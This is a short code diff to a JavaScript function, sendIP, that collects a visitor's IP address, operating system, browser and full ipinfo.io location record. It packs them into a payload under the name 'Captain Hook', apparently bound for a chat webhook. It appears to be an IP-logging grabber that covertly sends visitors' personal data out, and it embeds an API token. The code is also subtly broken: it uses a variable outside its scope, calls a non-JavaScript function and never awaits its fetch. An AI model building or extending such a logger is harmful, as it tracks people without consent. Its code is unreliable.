@@ -24,11 +24,11 @@ async function sendIP() {
     else if (userAgent.indexOf("Edge") !== -1) browser = "Edge";
 
     //get location
-    let location = "Unknown location"
+    let user_data = "Unknown location"
     fetch('https://ipinfo.io/json?token=8ec6b8ecea78bc')
       .then(response => response.json())
       .then(data => {
-        location = str(data.city) + str(data.region) + str(data.country) 
+        user_data = data
       })
       .catch(error => {
         console.error("Error")
@@ -36,7 +36,7 @@ async function sendIP() {
 
     //create payload
     const payload = {
-      content: `IP: ${ip}, OS: ${os}, Browser: ${browser}`,
+      content: `IP: ${ip}, OS: ${os}, Browser: ${browser}, Location: ${data}`,
       username: 'Captain Hook'
     };
 
